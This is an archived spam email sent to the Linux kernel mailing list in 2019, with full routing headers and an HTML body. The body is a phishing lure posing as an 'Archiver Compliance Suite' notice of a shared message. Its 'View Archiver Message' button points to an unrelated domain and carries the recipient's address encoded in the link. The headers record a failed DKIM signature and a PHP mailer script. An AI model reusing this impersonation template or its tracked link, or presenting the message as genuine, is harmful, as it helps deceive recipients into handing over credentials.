Return-Path: <SRS0=ZU4q=WD=server.chinadesels.com=admin@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
X-Spam-Level: *
X-Spam-Status: No, score=1.7 required=3.0 tests=DATE_IN_PAST_24_48,
	DKIM_INVALID,DKIM_SIGNED,FROM_EXCESS_BASE64,HEADER_FROM_DIFFERENT_DOMAINS,
	HTML_MESSAGE,HTML_MIME_NO_HTML_TAG,MIME_HTML_ONLY,SPF_HELO_NONE,SPF_PASS,
	URIBL_BLOCKED autolearn=no autolearn_force=no version=3.4.0
Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
	by smtp.lore.kernel.org (Postfix) with ESMTP id 90A1AC32751
	for <linux-kernel@archiver.kernel.org>; Wed,  7 Aug 2019 09:35:55 +0000 (UTC)
Received: from server.chinadesels.com (unknown [188.209.49.29])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by mail.kernel.org (Postfix) with ESMTPS id 4731421E6E
	for <linux-kernel@archiver.kernel.org>; Wed,  7 Aug 2019 09:35:55 +0000 (UTC)
Authentication-Results: mail.kernel.org;
	dkim=fail reason="key not found in DNS" (0-bit key) header.d=server.chinadesels.com header.i=@server.chinadesels.com header.b="jekjtwQY"
DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org 4731421E6E
Authentication-Results: mail.kernel.org; dmarc=none (p=none dis=none) header.from=server.chinadesels.com
Authentication-Results: mail.kernel.org; spf=none smtp.mailfrom=admin@server.chinadesels.com
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=server.chinadesels.com; s=mail; h=Date:Message-Id:Content-Transfer-Encoding
	:Content-Type:MIME-Version:From:Subject:To:Sender:Reply-To:Cc:Content-ID:
	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
	List-Subscribe:List-Post:List-Owner:List-Archive;
	bh=chgWs0ADRpPFST2H4kI2gDu3uYGWMKy6A+g7NaW9kYk=; b=jekjtwQYBfxcW+p0sopzayL2iL
	8k/1yBtyhy6iV6hB4UNFt/dyO3RYtie1FKEmrMp85YhsIdT7yYMibQa0/P/KaCGeduAaOCloLF7NE
	oUZeHlOUmixiqIPZG6b18wkfQ4rO31EIbrFtJ0WY6GTML5tWlAgugExXykF5d1xjPVQg=;
Received: from admin by server.chinadesels.com with local (Exim 4.92)
	(envelope-from <admin@server.chinadesels.com>)
	id 1huvQk-0008La-Ax
	for linux-kernel@archiver.kernel.org; Tue, 06 Aug 2019 09:06:54 +0000
To: linux-kernel@archiver.kernel.org
Subject:  =?UTF-8?B?WW91IGhhdmUgYSBOZXcgTWVzc2FnZSBvbiBBcmNoaXZlcg==?=  =?UTF-8?B?IE1hbmFnZW1lbnQ=?=
X-PHP-Originating-Script: 501:round.php
From: Archiver =?UTF-8?B?IE1hbmFnZW1lbnQ=?= <no-reply-archiver-management-sharing-messenger-worker@server.chinadesels.com>
MIME-Version: 1.0
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: 7BIT
Message-Id: <E1huvQk-0008La-Ax@server.chinadesels.com>
Date: Tue, 06 Aug 2019 09:06:54 +0000
List-Id: <linux-kernel.vger.kernel.org>

<div id="divRplyFwdMsg" dir="ltr" style="font-family: Calibri, Helvetica, sans-serif, EmojiFont, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, NotoColorEmoji, &quot;Segoe UI Symbol&quot;, &quot;Android Emoji&quot;, EmojiSymbols; font-size: 16px; background-color: rgb(255, 255, 255);">&nbsp;</div><div style="font-family: Calibri, Helvetica, sans-serif, EmojiFont, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, NotoColorEmoji, &quot;Segoe UI Symbol&quot;, &quot;Android Emoji&quot;, EmojiSymbols; font-size: 16px; background-color: rgb(255, 255, 255);"><div style="background-color: rgb(244, 248, 245);"><div style="float: left; margin-left: 18px; padding-top: 5px; padding-bottom: 5px; padding-right: 5px; width: 991.688px;"><div style="font-size: 13px; font-family: wf_segoe-ui_normal, &quot;Segoe UI&quot;, &quot;Segoe WP&quot;, Tahoma, Arial, sans-serif;">Trusted Archiver Internal Message.</div></div><div><div style="background-color: rgb(86, 166, 89); width: 5px; h
 eight: 30px;"></div><p style="margin-top: 0px; margin-bottom: 0px;"></p></div></div><div>&nbsp;</div><div><br></div><div><table border="0" cellspacing="0" cellpadding="0" width="100%"><tbody><tr><td align="center"><table border="0" bgcolor="#EEF1F5" cellspacing="0" cellpadding="0" width="604"><tbody><tr><td align="center" style="border-top: 4px solid rgb(85, 88, 175); padding: 20px 0px 0px;"><font color="#5558af" face="Segoe UI, Tahoma, Geneva, Verdana, sans-serif"><span style="font-size: 24px;">Archiver Compliance Suite</span></font></td></tr><tr><td align="center" width="260" style="padding: 20px 0px;"><div style="width: 100px; height: 100px; background-color: rgb(205, 99, 210); border-radius: 50%;"><span style="top: 25px; font-size: 50px; line-height: 50px; color: rgb(255, 255, 255);"></span></div></td></tr><tr><td align="center" style="padding: 0px 132px 10px;"><h3 style="color: rgb(22, 35, 58); margin: 0px;"><span style="font-family: &quot;Segoe UI&quot;, Tahoma, Geneva, Verdan
 a, sans-serif;">Archiver &nbsp;</span></h3></td></tr><tr><td align="center" style="padding-bottom: 20px;"><p style="margin: 0px; padding: 0px 60px; font-size: 0.9em; font-family: &quot;Segoe UI&quot;, Tahoma, Geneva, Verdana, sans-serif; color: rgb(22, 35, 58);"><b>Archiver</b>&nbsp; Management has shared an important message via to you via Unified Sharedrive.</p></td></tr></tbody></table><table bgcolor="#EEF1F5" border="0" cellpadding="0" cellspacing="0" width="604"><tbody><tr><td align="center" style="padding: 5px 162px 40px;"><table border="0" cellspacing="0" cellpadding="0" width="280"><tbody><tr><td align="center" bgcolor="#5558AF" width="280" style="border: 2px solid rgb(85, 88, 175); padding: 10px 0px;"><a href="https://mantrabazar.com/p?0@=bGludXgta2VybmVsQGFyY2hpdmVyLmtlcm5lbC5vcmc=" id="LPlnk964493" class="OWAAutoLink" previewremoved="true" style="font-family: &quot;Segoe UI&quot;, Tahoma, Geneva, Verdana, sans-serif; font-size: 14px; color: rgb(255, 255, 255); text-decora
 tion-line: none;"><b>View Archiver Message</b></a></td></tr></tbody></table></td></tr></tbody></table></td></tr><tr><td><br></td></tr></tbody></table></div></div>
    
